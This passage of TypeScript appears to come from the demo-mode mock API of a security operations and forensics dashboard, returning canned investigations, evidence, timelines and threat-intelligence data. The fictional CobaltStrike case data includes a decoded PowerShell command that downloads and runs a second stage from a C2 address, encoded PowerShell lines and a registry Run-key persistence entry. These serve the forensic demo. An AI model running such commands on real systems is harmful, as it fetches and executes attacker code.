    const q = (sp.get('q') || '').toLowerCase();
    if (!q) return ok({ alerts: [], incidents: [], agents: [], sigma_rules: [] });
    return ok({
      alerts:      D.alerts.filter((a: any) => a.rule_name?.toLowerCase().includes(q)).slice(0, 5),
      incidents:   D.incidents.filter((i: any) => i.title?.toLowerCase().includes(q)).slice(0, 5),
      agents:      D.agents.filter((a: any) => a.hostname?.toLowerCase().includes(q)).slice(0, 5),
      sigma_rules: D.sigma_rules.filter((r: any) => r.title?.toLowerCase().includes(q)).slice(0, 5),
    });
  }

  // ── Log Sources ───────────────────────────────────────────────────────────
  if (!(globalThis as any).__demoLogSources) {
    (globalThis as any).__demoLogSources = D.log_sources.map((s: any) => ({ ...s }));
    (globalThis as any).__demoLsNextId   = 100;
  }
  const _demoLS: any[] = (globalThis as any).__demoLogSources;

  if (p === '/log-sources' && method === 'GET') return ok(_demoLS);
  if (p === '/log-sources' && method === 'POST') {
    const b = JSON.parse(body || '{}');
    const isHttp = b.source_type === 'http';
    const newSrc = {
      id:           (globalThis as any).__demoLsNextId++,
      name:         b.name || 'New Source',
      source_type:  b.source_type || 'syslog',
      ip_address:   b.ip_address || null,
      format:       b.format || 'auto',
      device_type:  b.device_type || 'generic',
      enabled:      true,
      last_event:   null,
      event_count:  0,
      created_at:   new Date().toISOString(),
      api_key:      isHttp ? `demo-key-${Math.random().toString(36).slice(2,18)}` : undefined,
      api_key_hint: isHttp ? '…demo' : undefined,
    };
    _demoLS.push(newSrc);
    return { status: 201, data: newSrc };
  }
  if (/^\/log-sources\/\d+$/.test(p) && method === 'PUT') {
    const sid = parseInt(p.split('/')[2]);
    const b   = JSON.parse(body || '{}');
    const idx = _demoLS.findIndex((s: any) => s.id === sid);
    if (idx !== -1) {
      if (b.name        !== undefined) _demoLS[idx].name        = b.name;
      if (b.device_type !== undefined) _demoLS[idx].device_type = b.device_type;
      if (b.enabled     !== undefined) _demoLS[idx].enabled     = b.enabled;
    }
    return ok({ ok: true });
  }
  if (/^\/log-sources\/\d+$/.test(p) && method === 'DELETE') {
    const sid = parseInt(p.split('/')[2]);
    const idx  = _demoLS.findIndex((s: any) => s.id === sid);
    if (idx !== -1) _demoLS.splice(idx, 1);
    return ok({ ok: true });
  }

  // ── Log Search / Live Logs ────────────────────────────────────────────────
  if (p === '/logs/search') {
    const aid = sp.get('agent_id');
    const src = sp.get('source');
    const rng = sp.get('range') || '24h';
    const lim = parseInt(sp.get('limit') || '500');
    const cutoffH: Record<string, number> = { '15m':0.25,'1h':1,'6h':6,'24h':24,'7d':168,'30d':720 };
    const cutoffMs = (cutoffH[rng] ?? Infinity) * 3600000;
    const since    = cutoffMs === Infinity ? 0 : Date.now() - cutoffMs;
    let arr = [...DEMO_SEARCH_LOGS];
    if (aid) arr = arr.filter((l: any) => String(l.agent_id) === aid);
    if (src) arr = arr.filter((l: any) => l.log_source?.toLowerCase().includes(src.toLowerCase()));
    if (since > 0) arr = arr.filter((l: any) => new Date(l.collected_at).getTime() >= since);
    return ok({ logs: arr.slice(0, lim), total: arr.length, page: 0, has_more: false });
  }
  if (p === '/logs/stats') {
    const now = Date.now();
    const bySrc: Record<string,number> = {};
    const byAg:  Record<number,number> = {};
    for (const l of DEMO_SEARCH_LOGS) { bySrc[l.log_source] = (bySrc[l.log_source]??0)+1; byAg[l.agent_id] = (byAg[l.agent_id]??0)+1; }
    return ok({
      total_logs:     DEMO_SEARCH_LOGS.length * 1247,
      retention_days: 90,
      hourly_volume:  Array.from({ length: 24 }, (_, i) => ({ hour: new Date(now-(23-i)*3600000).toISOString(), count: Math.floor(seededRand(i*7)*600+120) })),
      by_source:      Object.entries(bySrc).map(([source,count])=>({source,count})).sort((a:any,b:any)=>b.count-a.count).slice(0,8),
      by_agent:       D.agents.map((a: any) => ({ agent_id: a.id, hostname: a.hostname, count: byAg[a.id]??0 })),
    });
  }
  if (p === '/logs/searches' && method === 'GET') return ok(_savedSearches);
  if (p === '/logs/searches' && method === 'POST') {
    const body = typeof sp.get === 'function' ? {} : (sp as any);
    const q: any = { id: _nextSavedId++, name: (body as any).name ?? 'Untitled', query: (body as any).query ?? '', time_range: (body as any).time_range ?? '24h', run_count: 0, last_run_at: null, created_at: new Date().toISOString() };
    _savedSearches = [..._savedSearches, q];
    return ok(q);
  }
  if (/^\/logs\/searches\/\d+$/.test(p) && method === 'DELETE') {
    const sid = parseInt(p.split('/').pop()!);
    _savedSearches = _savedSearches.filter((s: any) => s.id !== sid);
    return ok({ ok: true });
  }
  if (/^\/logs\/searches\/\d+\/run$/.test(p) && method === 'POST') {
    const sid  = parseInt(p.split('/')[3]);
    const saved = _savedSearches.find((s: any) => s.id === sid);
    if (saved) { (saved as any).run_count++; (saved as any).last_run_at = new Date().toISOString(); }
    return ok({ logs: DEMO_SEARCH_LOGS.slice(0, 50), total: DEMO_SEARCH_LOGS.length, page: 0, has_more: false });
  }
  if (p === '/logs/retention') return ok({ retention_days: 90 });
  if (p === '/logs/retention' && method === 'PUT') return ok({ ok: true });

  // ── Risk Posture — with asset_scores ─────────────────────────────────────
  if (p === '/risk-posture')         return ok(riskPostureSnap());
  if (p === '/risk-posture/history') return ok(riskPostureSnap().trend.slice(-(parseInt(sp.get('limit') || '30'))));

  // ── ITDR / DFIR — collections with label/triggered_by/agent_hostname ─────
  if (p === '/itdr/findings')     return ok({ findings: D.itdr_findings, total: D.itdr_findings.length });
  if (p === '/dfir/collections')  return ok(DFIR_COLLECTIONS);
  if (/^\/dfir\/collections\/\d+\/timeline$/.test(p)) return ok([]);

  // ── DFIR Enterprise GET stubs ─────────────────────────────────────────────
  if (p === '/dfir/dashboard') return ok({
    stats: { total: 12, open: 5, in_progress: 3, closed: 4, high_priority: 4, evidence_items: 47, memory_dumps: 3, disk_images: 1, open_cases: 8, custody_ok: 41, custody_pending: 6 },
    recent: [
      { id: 101, title: 'Spearphishing → CobaltStrike Beacon', priority: 'critical', status: 'in_progress', analyst: 'analyst-1', created_at: new Date(Date.now() - 3600000).toISOString() },
      { id: 102, title: 'Insider Data Exfiltration via USB', priority: 'high', status: 'open', analyst: 'analyst-2', created_at: new Date(Date.now() - 7200000).toISOString() },
      { id: 103, title: 'Ransomware Pre-Staging Detection', priority: 'critical', status: 'open', analyst: 'analyst-1', created_at: new Date(Date.now() - 86400000).toISOString() },
      { id: 104, title: 'Kerberoasting via Service Accounts', priority: 'high', status: 'in_progress', analyst: 'analyst-3', created_at: new Date(Date.now() - 172800000).toISOString() },
      { id: 105, title: 'Unauthorized Cloud IAM Backdoor', priority: 'high', status: 'closed', analyst: 'analyst-2', created_at: new Date(Date.now() - 259200000).toISOString() },
    ],
  });
  if (p === '/dfir/investigations' || p.startsWith('/dfir/investigations?')) return ok([
    { id: 101, investigation_id: 'INV-9999-00101', case_id: 'CASE-2026-0042', title: 'Spearphishing → CobaltStrike Beacon', analyst: 'analyst-1', priority: 'critical', status: 'in_progress', tags: 'phishing,cobalt-strike,c2', target_hosts: 'WORKSTATION-01,SERVER-DC01', mitre_techniques: 'T1566.001,T1059.001,T1071.001,T1021.002', version: 3, evidence_count: 12, created_at: new Date(Date.now() - 3600000).toISOString(), updated_at: new Date(Date.now() - 1800000).toISOString() },
    { id: 102, investigation_id: 'INV-9999-00102', case_id: 'CASE-2026-0043', title: 'Insider Data Exfiltration via USB', analyst: 'analyst-2', priority: 'high', status: 'open', tags: 'insider,usb,exfil', target_hosts: 'LAPTOP-HR-03', mitre_techniques: 'T1052.001,T1005', version: 1, evidence_count: 4, created_at: new Date(Date.now() - 7200000).toISOString(), updated_at: new Date(Date.now() - 7200000).toISOString() },
    { id: 103, investigation_id: 'INV-9999-00103', case_id: 'CASE-2026-0040', title: 'Ransomware Pre-Staging Detection', analyst: 'analyst-1', priority: 'critical', status: 'open', tags: 'ransomware,vss,pre-staging', target_hosts: 'FILE-SERVER-01,BACKUP-01', mitre_techniques: 'T1486,T1490,T1489', version: 2, evidence_count: 8, created_at: new Date(Date.now() - 86400000).toISOString(), updated_at: new Date(Date.now() - 43200000).toISOString() },
    { id: 104, investigation_id: 'INV-9999-00104', case_id: 'CASE-2026-0039', title: 'Kerberoasting via Service Accounts', analyst: 'analyst-3', priority: 'high', status: 'in_progress', tags: 'kerberos,credential,ad', target_hosts: 'SERVER-DC01', mitre_techniques: 'T1558.003', version: 1, evidence_count: 3, created_at: new Date(Date.now() - 172800000).toISOString(), updated_at: new Date(Date.now() - 86400000).toISOString() },
    { id: 105, investigation_id: 'INV-9999-00105', case_id: 'CASE-2026-0035', title: 'Unauthorized Cloud IAM Backdoor', analyst: 'analyst-2', priority: 'high', status: 'closed', tags: 'cloud,iam,persistence', target_hosts: 'aws-prod-01', mitre_techniques: 'T1078,T1136', version: 4, evidence_count: 20, created_at: new Date(Date.now() - 259200000).toISOString(), updated_at: new Date(Date.now() - 172800000).toISOString() },
  ]);
  if (/^\/dfir\/investigations\/(\d+)$/.test(p)) {
    const iid = parseInt(p.split('/')[3]);
    const inv = [
      { id: 101, investigation_id: 'INV-9999-00101', case_id: 'CASE-2026-0042', title: 'Spearphishing → CobaltStrike Beacon', incident_id: 77, analyst: 'analyst-1', priority: 'critical', status: 'in_progress', classification: 'TLP:AMBER', tags: 'phishing,cobalt-strike,c2', notes: 'User opened malicious macro. PowerShell spawned from WINWORD.EXE. C2 established to 185.220.101.47. Lateral movement via SMB to DC01.', target_hosts: 'WORKSTATION-01,SERVER-DC01', target_users: 'john.smith,svc-backup', mitre_techniques: 'T1566.001,T1059.001,T1071.001,T1021.002,T1041', root_cause: 'Malicious macro-enabled Excel file delivered via spearphishing email opened by finance user.', executive_summary: 'CobaltStrike beacon deployed after phishing. Lateral movement to DC observed. Data staged for exfiltration.', version: 3, evidence_count: 12, created_at: new Date(Date.now() - 3600000).toISOString(), updated_at: new Date(Date.now() - 1800000).toISOString() },
    ].find(i => i.id === iid);
    if (inv) return ok(inv);
    return ok({ id: iid, investigation_id: `INV-9999-0${iid}`, case_id: '', title: 'Investigation', analyst: 'analyst-1', priority: 'medium', status: 'open', classification: '', tags: '', notes: '', target_hosts: 'WORKSTATION-01', target_users: '', mitre_techniques: '', root_cause: '', executive_summary: '', version: 1, evidence_count: 0, created_at: new Date().toISOString(), updated_at: new Date().toISOString() });
  }
  if (p === '/dfir/evidence' || p.startsWith('/dfir/evidence?') || /^\/dfir\/investigations\/\d+\/evidence/.test(p)) return ok([
    { id: 1, evidence_id: 'EV-101-00001-processes', investigation_id: 101, type: 'process_list', label: 'Running Processes — WORKSTATION-01', description: 'Full process snapshot from WORKSTATION-01', source_host: 'WORKSTATION-01', collector: 'analyst-1', sha256: 'a1b2c3d4e5f6', md5: '1a2b3c4d', size_bytes: 45056, status: 'collected', collected_at: new Date(Date.now() - 3500000).toISOString() },
    { id: 2, evidence_id: 'EV-101-00001-connections', investigation_id: 101, type: 'network_capture', label: 'Network Connections — WORKSTATION-01', description: 'Active network connections at time of incident', source_host: 'WORKSTATION-01', collector: 'analyst-1', sha256: 'b2c3d4e5f6a1', md5: '2b3c4d1a', size_bytes: 128512, status: 'collected', collected_at: new Date(Date.now() - 3400000).toISOString() },
    { id: 3, evidence_id: 'EV-101-00001-event_logs', investigation_id: 101, type: 'event_logs', label: 'Event Logs — WORKSTATION-01', description: 'Windows Security and System event logs', source_host: 'WORKSTATION-01', collector: 'analyst-1', sha256: 'c3d4e5f6a1b2', md5: '3c4d1a2b', size_bytes: 2097152, status: 'analyzed', collected_at: new Date(Date.now() - 3300000).toISOString() },
    { id: 4, evidence_id: 'EV-101-00001-memory', investigation_id: 101, type: 'memory_dump', label: 'Memory Dump — WORKSTATION-01', description: 'Full physical memory dump (8GB)', source_host: 'WORKSTATION-01', collector: 'analyst-1', sha256: 'd4e5f6a1b2c3', md5: '4d1a2b3c', size_bytes: 8589934592, status: 'collected', collected_at: new Date(Date.now() - 3200000).toISOString() },
    { id: 5, evidence_id: 'EV-101-00001-file_hashes', investigation_id: 101, type: 'file_hash_list', label: 'File Inventory — SERVER-DC01', description: 'File hash inventory from domain controller', source_host: 'SERVER-DC01', collector: 'analyst-1', sha256: 'e5f6a1b2c3d4', md5: '5e1a2b3c', size_bytes: 4096000, status: 'collected', collected_at: new Date(Date.now() - 3100000).toISOString() },
  ]);
  if (/^\/dfir\/evidence\/\d+$/.test(p)) {
    const eid = parseInt(p.split('/')[3]);
    return ok({ id: eid, evidence_id: `EV-101-0000${eid}`, investigation_id: 101, type: 'process_list', label: `Evidence Item ${eid}`, description: 'Collected artifact', source_host: 'WORKSTATION-01', collector: 'analyst-1', sha256: 'a1b2c3d4e5f6', md5: '1a2b3c4d', size_bytes: 45056, storage_location: 'xcloak://evidence/9999/101/processes', status: 'collected', analysis_result: null, collected_at: new Date().toISOString() });
  }
  if (/^\/dfir\/evidence\/\d+\/custody$/.test(p)) return ok([
    { id: 1, action: 'collected', actor: 'analyst-1', location: 'WORKSTATION-01', notes: 'Initial collection via remote agent', hash_verified: false, created_at: new Date(Date.now() - 3500000).toISOString() },
    { id: 2, action: 'transferred', actor: 'analyst-1', location: 'xcloak-evidence-store-1', notes: 'Transferred to secure evidence storage', hash_verified: true, created_at: new Date(Date.now() - 3000000).toISOString() },
    { id: 3, action: 'analyzed', actor: 'analyst-2', location: 'analyst-2-workstation', notes: 'Memory analysis performed with Volatility 3', hash_verified: true, created_at: new Date(Date.now() - 2000000).toISOString() },
  ]);
  if (/^\/dfir\/investigations\/\d+\/tasks$/.test(p)) return ok([
    { id: 1, target_host: 'WORKSTATION-01', collection_type: 'targeted', artifacts: 'processes,connections,event_logs,file_hashes', status: 'completed', requested_by: 'analyst-1', evidence_count: 4, result_summary: 'Collected 4 artifact sets from WORKSTATION-01', created_at: new Date(Date.now() - 3500000).toISOString(), completed_at: new Date(Date.now() - 3400000).toISOString() },
    { id: 2, target_host: 'SERVER-DC01', collection_type: 'targeted', artifacts: 'event_logs,users,file_hashes', status: 'completed', requested_by: 'analyst-1', evidence_count: 3, result_summary: 'Collected 3 artifact sets from SERVER-DC01', created_at: new Date(Date.now() - 2000000).toISOString(), completed_at: new Date(Date.now() - 1900000).toISOString() },
  ]);
  if (/^\/dfir\/investigations\/\d+\/timeline$/.test(p)) return ok([
    { id: 1, event_time: new Date(Date.now() - 7200000).toISOString(), event_type: 'alert', source: 'xcloak', host: 'WORKSTATION-01', user_name: 'john.smith', description: 'Suspicious PowerShell execution detected', severity: 'critical', mitre_technique: 'T1059.001', is_manual: false },
    { id: 2, event_time: new Date(Date.now() - 7140000).toISOString(), event_type: 'command', source: 'audit', host: 'WORKSTATION-01', user_name: 'john.smith', description: 'powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA', severity: 'critical', mitre_technique: 'T1059.001', is_manual: false },
    { id: 3, event_time: new Date(Date.now() - 7080000).toISOString(), event_type: 'process', source: 'sysmon', host: 'WORKSTATION-01', user_name: 'john.smith', description: 'WINWORD.EXE spawned cmd.exe → powershell.exe', severity: 'high', mitre_technique: 'T1059.001', is_manual: false },
    { id: 4, event_time: new Date(Date.now() - 7020000).toISOString(), event_type: 'registry', source: 'sysmon', host: 'WORKSTATION-01', user_name: 'john.smith', description: 'Registry key set: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost32', severity: 'critical', mitre_technique: 'T1547.001', is_manual: false },
    { id: 5, event_time: new Date(Date.now() - 6900000).toISOString(), event_type: 'network', source: 'netflow', host: 'WORKSTATION-01', user_name: '', description: 'HTTPS connection to 185.220.101.47:443 (update-cdn-service.com)', severity: 'high', mitre_technique: 'T1071.001', is_manual: false },
    { id: 6, event_time: new Date(Date.now() - 6600000).toISOString(), event_type: 'alert', source: 'xcloak', host: 'SERVER-DC01', user_name: 'svc-backup', description: 'SMB lateral movement from WORKSTATION-01 to SERVER-DC01', severity: 'critical', mitre_technique: 'T1021.002', is_manual: false },
    { id: 7, event_time: new Date(Date.now() - 5400000).toISOString(), event_type: 'network', source: 'netflow', host: 'WORKSTATION-01', user_name: '', description: 'Large data transfer (2.1GB) to 185.220.101.47:443', severity: 'critical', mitre_technique: 'T1041', is_manual: false },
    { id: 8, event_time: new Date(Date.now() - 3600000).toISOString(), event_type: 'analyst', source: 'dfir', host: '', user_name: 'analyst-1', description: 'Investigation opened. Host isolated. Credentials reset for john.smith.', severity: 'info', mitre_technique: '', is_manual: true },
  ]);
  if (/^\/dfir\/investigations\/\d+\/process-tree$/.test(p)) return ok({
    total: 18,
    processes: [
      { pid: 4, ppid: 0, process_name: 'System', cmdline: '', username: 'SYSTEM', exe_path: '', host: 'WORKSTATION-01', children: [] },
      { pid: 628, ppid: 4, process_name: 'lsass.exe', cmdline: '', username: 'SYSTEM', exe_path: 'C:\\Windows\\System32\\lsass.exe', host: 'WORKSTATION-01', children: [] },
      { pid: 1032, ppid: 700, process_name: 'WINWORD.EXE', cmdline: 'WINWORD.EXE /n invoice_Q3.xlsm', username: 'john.smith', exe_path: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE', host: 'WORKSTATION-01', children: [
        { pid: 2048, ppid: 1032, process_name: 'cmd.exe', cmdline: 'cmd.exe /c powershell -enc SQBFAFgA', username: 'john.smith', exe_path: 'C:\\Windows\\System32\\cmd.exe', host: 'WORKSTATION-01', children: [
          { pid: 2144, ppid: 2048, process_name: 'powershell.exe', cmdline: 'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA', username: 'john.smith', exe_path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', host: 'WORKSTATION-01', children: [
            { pid: 2312, ppid: 2144, process_name: 'rundll32.exe', cmdline: 'rundll32.exe C:\\Users\\john.smith\\AppData\\Local\\Temp\\svc32.dll,DllRegisterServer', username: 'john.smith', exe_path: 'C:\\Windows\\System32\\rundll32.exe', host: 'WORKSTATION-01', children: [
              { pid: 2488, ppid: 2312, process_name: 'svchost32.exe', cmdline: 'svchost32.exe', username: 'john.smith', exe_path: 'C:\\Users\\john.smith\\AppData\\Local\\Temp\\svchost32.exe', host: 'WORKSTATION-01', children: [] }
            ]}
          ]}
        ]}
      ]},
    ],
  });
  if (/^\/dfir\/investigations\/\d+\/network$/.test(p)) return ok([
    { id: 1, protocol: 'TCP', local_address: '10.0.1.55:49821', remote_address: '185.220.101.47:443', state: 'ESTABLISHED', process_name: 'svchost32.exe', country: 'NL', host: 'WORKSTATION-01', collected_at: new Date(Date.now() - 6900000).toISOString() },
    { id: 2, protocol: 'TCP', local_address: '10.0.1.55:49822', remote_address: '185.220.101.47:443', state: 'CLOSE_WAIT', process_name: 'svchost32.exe', country: 'NL', host: 'WORKSTATION-01', collected_at: new Date(Date.now() - 6000000).toISOString() },
    { id: 3, protocol: 'TCP', local_address: '10.0.1.55:445', remote_address: '10.0.1.10:49901', state: 'ESTABLISHED', process_name: 'System', country: '', host: 'WORKSTATION-01', collected_at: new Date(Date.now() - 6600000).toISOString() },
    { id: 4, protocol: 'UDP', local_address: '10.0.1.55:53', remote_address: '8.8.8.8:53', state: 'LISTEN', process_name: 'svchost.exe', country: 'US', host: 'WORKSTATION-01', collected_at: new Date(Date.now() - 5000000).toISOString() },
  ]);
  if (/^\/dfir\/investigations\/\d+\/artifacts$/.test(p)) return ok({
    platform: sp.get('platform') || 'windows',
    available: ['mft', 'usn_journal', 'amcache', 'shimcache', 'srum', 'prefetch', 'jump_lists', 'registry_hives'],
    artifact_type: sp.get('artifact') || '',
    entries: [
      { host: 'WORKSTATION-01', log_source: 'prefetch', message: 'C:\\Windows\\Prefetch\\POWERSHELL.EXE-06AC6714.pf — 27 executions, last run 2026-07-10T08:15:42Z', timestamp: new Date(Date.now() - 7080000).toISOString() },
      { host: 'WORKSTATION-01', log_source: 'amcache', message: 'svchost32.exe — SHA1: aabbccddeeff, First execution: 2026-07-10T08:16:01Z', timestamp: new Date(Date.now() - 7020000).toISOString() },
      { host: 'WORKSTATION-01', log_source: 'shimcache', message: 'rundll32.exe — Last modified: 2026-07-10T08:15:58Z — NOT shimmed previously (suspicious)', timestamp: new Date(Date.now() - 7000000).toISOString() },
    ],
  });
  if (/^\/dfir\/investigations\/\d+\/notebook$/.test(p)) return ok([
    { id: 1, entry_type: 'note', title: 'Initial Triage', content: '## Initial Triage\n\nUser reported suspicious pop-up at 08:20. SOC alert triggered at 08:22 for encoded PowerShell execution.\n\n**Actions taken:**\n- Host isolated at 08:35\n- User credentials reset at 08:40\n- Memory dump initiated', author: 'analyst-1', evidence_refs: '1,2', tags: 'triage,initial', created_at: new Date(Date.now() - 3400000).toISOString(), updated_at: new Date(Date.now() - 3400000).toISOString() },
    { id: 2, entry_type: 'evidence', title: 'Decoded PowerShell Payload', content: '```powershell\nIEX (New-Object Net.WebClient).DownloadString("http://185.220.101.47/stage2.ps1")\n```\n\nPayload downloads second-stage beacon from C2. Reflective DLL injection into notepad.exe observed.', author: 'analyst-1', evidence_refs: '3', tags: 'malware,c2', created_at: new Date(Date.now() - 3000000).toISOString(), updated_at: new Date(Date.now() - 3000000).toISOString() },
    { id: 3, entry_type: 'query', title: 'Hunt Query — Encoded PS on All Hosts', content: 'SELECT hostname, cmdline, created_at FROM endpoint_processes WHERE cmdline ILIKE \'%-enc %\' ORDER BY created_at DESC', author: 'analyst-2', evidence_refs: '', tags: 'hunt,powershell', created_at: new Date(Date.now() - 2000000).toISOString(), updated_at: new Date(Date.now() - 2000000).toISOString() },
  ]);
  if (/^\/dfir\/investigations\/\d+\/graph$/.test(p)) return ok({
    nodes: [
      { id: 'inv-101', label: 'Spearphishing → CobaltStrike', type: 'investigation' },
      { id: 'host-WORKSTATION-01', label: 'WORKSTATION-01', type: 'host' },
      { id: 'host-SERVER-DC01', label: 'SERVER-DC01', type: 'host' },
      { id: 'user-john.smith', label: 'john.smith', type: 'user' },
      { id: 'proc-WINWORD.EXE', label: 'WINWORD.EXE', type: 'process' },
      { id: 'proc-powershell.exe', label: 'powershell.exe', type: 'process' },
      { id: 'proc-svchost32.exe', label: 'svchost32.exe', type: 'process' },
      { id: 'ioc-185.220.101.47', label: '185.220.101.47', type: 'network' },
      { id: 'mitre-T1566.001', label: 'T1566.001', type: 'mitre' },
      { id: 'mitre-T1059.001', label: 'T1059.001', type: 'mitre' },
      { id: 'actor-APT29', label: 'APT29 (suspected)', type: 'threat_actor' },
    ],
    edges: [
      { from: 'inv-101', to: 'host-WORKSTATION-01', label: 'targets' },
      { from: 'inv-101', to: 'host-SERVER-DC01', label: 'targets' },
      { from: 'host-WORKSTATION-01', to: 'user-john.smith', label: 'logged_in' },
      { from: 'host-WORKSTATION-01', to: 'proc-WINWORD.EXE', label: 'runs' },
      { from: 'proc-WINWORD.EXE', to: 'proc-powershell.exe', label: 'spawns' },
      { from: 'proc-powershell.exe', to: 'proc-svchost32.exe', label: 'injects' },
      { from: 'proc-svchost32.exe', to: 'ioc-185.220.101.47', label: 'connects' },
      { from: 'inv-101', to: 'mitre-T1566.001', label: 'maps_to' },
      { from: 'inv-101', to: 'mitre-T1059.001', label: 'maps_to' },
      { from: 'actor-APT29', to: 'inv-101', label: 'suspected' },
    ],
  });
  if (/^\/dfir\/investigations\/\d+\/threat-intel$/.test(p)) return ok({
    threat_actors: [{ name: 'APT29 (Cozy Bear)', aliases: ['The Dukes', 'IRON HEMLOCK'], motivation: 'Espionage', ttps: ['T1566.001', 'T1059.001', 'T1071.001'] }],
    malware_families: [{ name: 'CobaltStrike', type: 'C2 Framework', c2: 'HTTPS/DNS', capabilities: ['Process injection', 'Keylogging', 'Lateral movement'] }],
    ioc_matches: [{ ioc: '185.220.101.47', type: 'ip', reputation: 'malicious', context: 'Known Tor exit node used for C2' }, { ioc: 'update-cdn-service.com', type: 'domain', reputation: 'malicious', context: 'Registered 2 days before attack, parked on bulletproof hosting' }],
    campaigns: [{ name: 'Operation DarkStar', actor: 'APT29', timeframe: '2026-Q2', target_sectors: ['Finance', 'Government', 'Healthcare'] }],
    cves: [{ id: 'CVE-2025-21298', cvss: 9.8, description: 'Office OLE memory corruption — used for initial exploitation' }],
    attribution_confidence: 72,
    executive_brief: 'High confidence attribution to APT29 based on C2 infrastructure, beacon configuration, and TTP overlap with known campaigns.',
  });
  if (p === '/dfir/analytics') return ok({
    by_priority: [{ label: 'critical', value: 3 }, { label: 'high', value: 5 }, { label: 'medium', value: 3 }, { label: 'low', value: 1 }],
    by_status: [{ label: 'open', value: 5 }, { label: 'in_progress', value: 3 }, { label: 'closed', value: 4 }],
    by_evidence_type: [{ label: 'event_logs', value: 18 }, { label: 'process_list', value: 12 }, { label: 'network_capture', value: 9 }, { label: 'memory_dump', value: 3 }, { label: 'file_hash_list', value: 5 }],
    daily: Array.from({ length: 14 }, (_, i) => ({ day: new Date(Date.now() - (13 - i) * 86400000).toISOString().slice(0, 10), count: Math.floor(Math.random() * 3) })),
    avg_mttr_hours: 18.4,
  });
  if (p.startsWith('/dfir/search')) return ok({ query: sp.get('q') || '', results: [], total: 0 });

  // ── MDM — getDevices() reads res.data?.devices ───────────────────────────
  if (p === '/mdm/devices')             return ok({ devices: MDM_DEVICES });
  if (p === '/mdm/enrollment-tokens')   return ok(D.mdm_enrollment_tokens ?? []);
  if (p === '/mdm/compliance/summary')  return ok({ total: MDM_DEVICES.length, compliant: 2, non_compliant: 1, unknown: 0 });
  if (/^\/mdm\/devices\/\d+\/compliance$/.test(p)) return ok({ results: [] });
  if (/^\/mdm\/devices\/\d+\/commands$/.test(p))   return ok({ commands: [] });

  // ── Correlation — rule_name/action/stages/source_type ────────────────────
  if (p === '/correlation/rules')   return ok(CORRELATION_RULES_NORMALIZED);
  if (p === '/correlation/matches') {
    const rid = sp.get('rule_id');
    return ok(rid ? D.correlation_matches.filter((m: any) => String(m.rule_id) === rid) : D.correlation_matches);
  }

  // ── Playbooks ─────────────────────────────────────────────────────────────
  if (p === '/playbooks') return ok(D.playbooks);
  if (/^\/playbooks\/\d+$/.test(p)) {
    const id = parseInt(p.split('/')[2]);
    return ok(D.playbooks.find((pb: any) => pb.id === id) ?? notFound().data);
  }
  if (/^\/playbooks\/\d+\/actions$/.test(p))          return ok([]);
  if (p === '/playbook-executions')                    return ok(D.playbook_executions);
  if (/^\/playbook-executions\/\d+\/steps$/.test(p))  return ok([]);
  if (p === '/tasks/pending-approval')                 return ok([]);

  // ── Compliance ────────────────────────────────────────────────────────────
  if (p === '/compliance/reports') return ok(D.compliance_reports);
  if (/^\/compliance\/reports\/\d+$/.test(p)) {
    const id     = parseInt(p.split('/')[3]);
    const rep    = D.compliance_reports.find((r: any) => r.id === id);
    const scores = D.compliance_scores.filter((s: any) => s.report_id === id);
    return ok({ ...rep, scores });
  }
  // Framework compliance — FrameworkAssessment[] with overall_score/covered/partial/gaps/controls
  if (p === '/framework-compliance') return ok(FRAMEWORK_ASSESSMENTS);

  // ── Network Behaviour / NBA ───────────────────────────────────────────────
  if (p === '/nba/anomalies') {
    return ok(D.network_anomalies.slice(0, parseInt(sp.get('limit') || '200')));
  }

  // ── Attack Path — source/target + top_paths ───────────────────────────────
  if (p === '/attack-path') return ok(ATTACK_PATH);

  // ── Network Map — full node/edge shape + summary ──────────────────────────
  if (p === '/network-map') return ok(NETWORK_MAP);
  if (p === '/network-map/ip-info') {
    const ip = sp.get('ip') ?? '';
    return ok({
      ip, is_private: false, is_proxy: false, is_hosting: false, is_ioc: false,
      threat_level: 'none', threat_tags: [], sources: [],
      country: 'Unknown', org: 'Demo Network', asn: 'AS0',
    });
  }

  // ── MITRE ─────────────────────────────────────────────────────────────────
  if (p === '/mitre/mappings') return ok([]);

  // ── Settings / Integrations (read-only stubs) ─────────────────────────────
  if (p === '/integrations')              return ok([]);
  if (p === '/integrations/deliveries')   return ok([]);
  if (p === '/integrations/install-tokens') return ok([]);
  if (p === '/custom-roles')              return ok([]);
  if (p === '/permissions')               return ok([]);
  if (p === '/api-keys')                  return ok([]);
  if (p === '/users')                     return ok([{ id: 1, username: 'demo-viewer', email: 'demo@xcloak.tech', role: 'viewer', is_active: true }]);
  if (p === '/audit/logs')                return ok([]);
  if (p === '/audit/logs/paginated')      return ok({ logs: [], total: 0, page: 1, per_page: 50, pages: 0 });
  if (p === '/security-policy')           return ok({ mfa_required: false, session_timeout_minutes: 60, password_min_length: 12 });
  if (p === '/auth/sessions')             return ok([]);
  if (p === '/sessions')                  return ok([]);
  if (p === '/scheduled-reports') return ok([]);
  if (p === '/scheduler/tasks') {
    return ok([
      { id: 1, name: 'Auth Log Collection',    task_type: 'collect_auth_logs',    cron_expr: '*/15 * * * *', enabled: true,  agent_id: D.agents[0]?.id, last_run: new Date(Date.now() - 900000).toISOString(),    last_status: 'success' },
      { id: 2, name: 'Vulnerability Scan',     task_type: 'vulnerability_scan',   cron_expr: '0 2 * * *',    enabled: true,  agent_id: D.agents[1]?.id, last_run: new Date(Date.now() - 86400000).toISOString(),  last_status: 'success' },
      { id: 3, name: 'FIM Baseline Snapshot',  task_type: 'fim_snapshot',         cron_expr: '0 0 * * 0',    enabled: true,  agent_id: D.agents[0]?.id, last_run: new Date(Date.now() - 604800000).toISOString(), last_status: 'success' },
      { id: 4, name: 'Process Inventory',      task_type: 'collect_processes',    cron_expr: '*/5 * * * *',  enabled: false, agent_id: D.agents[2]?.id, last_run: new Date(Date.now() - 300000).toISOString(),    last_status: 'success' },
    ]);
  }

  // ── Executive / SOC Metrics ───────────────────────────────────────────────
  if (p === '/executive/metrics') {
    const now = Date.now();
    const days30 = Array.from({ length: 30 }, (_, i) => ({ date: new Date(now - (29 - i) * 86400000).toISOString().slice(0, 10), count: Math.floor(seededRand(i * 11) * 15 + 2) }));
    const tacticCounts: Record<string, number> = {};
